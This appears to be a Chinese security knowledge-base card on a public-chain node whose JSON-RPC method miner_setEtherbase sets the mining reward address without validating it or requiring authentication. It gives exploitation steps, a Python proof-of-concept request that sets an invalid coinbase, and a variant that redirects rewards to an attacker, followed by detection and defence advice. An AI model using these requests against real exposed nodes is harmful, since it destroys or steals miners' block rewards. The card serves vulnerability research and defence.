---
id: blockchain-consensus-rpc-setminercoinbase-address-validation-missing
title: 公链节点 RPC setMinerCoinbase 未校验地址格式：非法 coinbase 被接受导致挖矿收益损失
type: scenario
domain: blockchain
path: blockchain/consensus
technique: blockchain-rpc-miner-coinbase-address-validation-missing
aliases:
- miner_setEtherbase 参数校验缺失
- coinbase 地址未校验
- 非法 coinbase 生效
- 挖矿收益打水漂
- 公链 RPC 参数校验
tags:
- blockchain
- rpc
- mining
- coinbase
- parameter-validation
- json-rpc
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V568
  verified_at: '2026-11-12T09:19:11+08:00'
  notes: 已对照原文12954及全部7张图逐张核对：图01 EthJsonRpcImpl.miner_setEtherbase→blockchain.setMinerCoinbase(TypeConverter.hexToByteArray(coinBase))且无权限校验（同文件miner_setExtra同样hex直通；miner_setGasPrice实际仅return false）；图02 BlockchainImpl.setMinerCoinbase直接赋值/getMinerCoinbase返回；图03 miner_setEtherbase传入非20字节非法地址返回True；图04 eth_coinbase回读同一非法地址，证明生效；图05-07为setupkeypairs计数无上限的DoS（worker已按brief排除）。已修正两处与截图不符的表述：原文将miner_setGasPrice写成同样直接调用，实际该实现只return false，改为miner_setExtra为例。dedup 20候选均非同链（JSON-RPC/MCP/区块链其他卡），dup-scan无涉及，无需删除。原文未标注目标公链产品与版本（代码/路径打码），affected_versions保持空。
---

## 一句话结论

公链节点的 JSON-RPC 管理接口 `miner_setEtherbase`/`setMinerCoinbase` 直接把传入字节数组赋给 `minerCoinbase`，没有校验地址长度（20 字节）与格式；将 RPC 暴露且无鉴权时，攻击者可把它改成任意非法地址，之后节点出块奖励全部发往无人可花费的地址，矿工收益丢失。

## 原理

- **参数直通赋值**：审计目标（某公链的 Java JSON-RPC 实现）中 `public void setMinerCoinbase(byte[] minerCoinbase) { this.minerCoinbase = minerCoinbase; }`，只做 hex 解码（`TypeConverter.hexToByteArray`），不检查字节长度、是否合法公钥/地址、校验和等。
- **coinbase 的用途**：节点出块时把区块奖励（coinbase 交易输出）发给 `minerCoinbase`。地址若为非法值（长度不对/非有效公钥），收益无法被任何人花费，等同销毁。
- **为什么构成安全问题**：RPC 接口常被部署为仅绑定 localhost，但配置外置、反向代理暴露或凭据泄露时会变成远程可调用；接口本身没有权限校验（同文件的 `miner_setExtra` 同样把入参 `TypeConverter.hexToByteArray` 后直接赋值，均无会话校验），修改 coinbase 无需管理员会话。
- **利用门槛低**：一次 JSON-RPC 调用即可改变矿工收益地址，且节点不会报错（返回 true），矿工若不主动核对 `eth_coinbase` 很难发现。

## 触发条件

- 公链节点 RPC 接口可被攻击者访问（外置、反代、默认端口开放、或凭据泄露）；
- `miner_setEtherbase`/`setMinerCoinbase` 等接口无鉴权且未校验地址参数；
- 节点正在挖矿/出块，存在可损失的收益。

## 利用步骤

1. 探测 RPC：向 `http://target:port` POST JSON-RPC，确认 `eth_coinbase`/`miner_setEtherbase` 可用。
2. 构造非法 coinbase（如 31 字节的 `0xffff...` 或截断地址），调用 `miner_setEtherbase`：
   `{"jsonrpc":"2.0","method":"miner_setEtherbase","params":["0xffffffffefe...（非 20 字节）"],"id":1}`。
3. 调用 `eth_coinbase` 读取当前值，确认非法地址已被应用。
4. 节点后续出块奖励发送到非法地址；矿工收益损失（攻击者若无法花费该地址，则属破坏性利用；若构造为攻击者可花费的地址，则收益被窃取）。

## PoC

```python
import requests
URL = "http://127.0.0.1:5555"
data = {
    "jsonrpc": "2.0",
    "method": "miner_setEtherbase",
    "params": ["0xffffffffefefefefefefefefefefefefefefefefefefefefefefefef"],
    "id": 1,
}
print(requests.post(url=URL, json=data).json())   # {'jsonrpc':'2.0','id':1,'result':True}
print(requests.post(url=URL, json={"jsonrpc":"2.0","method":"eth_coinbase","params":[],"id":1}).json())
# result 返回同一非法地址，说明已生效
```

## 变体与关联

- 变体：同类未校验参数还有 `miner_setExtra`（hex 直通赋值）等（`miner_setGasPrice` 在该实现中直接 `return false`，不产生赋值）；把 coinbase 设为攻击者可控地址即可从"破坏"升级为"窃取收益"。
- 关联：公链 RPC 授权缺失（cpp-ethereum `miner_stop` 无 `RPC_ADMIN` 检查，CVE-2017-12118）与 for 循环参数无上限（`setupkeypairs` 的 count）均属公链 RPC 安全面，但前者是 DoS、后者是资源耗尽，本卡只聚焦参数校验缺失导致的收益损失。
- 关联：节点 RPC 暴露面与请求处理流程（go-ethereum `ServeHTTP`/`validateRequest`）见公链 RPC 源码分析；RPC 未授权访问类参见 web/generic/auth 的 JSON-RPC 卡。

## 检测与防御

- 检测：监控 `miner_setEtherbase`/`miner_setExtra`/`miner_setGasPrice` 等管理方法的 JSON-RPC 调用与来源 IP；对 `eth_coinbase` 变更告警；核对出块奖励地址与登记地址是否一致。
- 防御：RPC 默认只绑定 127.0.0.1 并加认证（token/HTTP basic）；禁用不必要的 admin/miner 命名空间；在 `setMinerCoinbase` 中校验地址长度（20 字节）、格式与校验和；对管理接口加权限校验与审计日志。
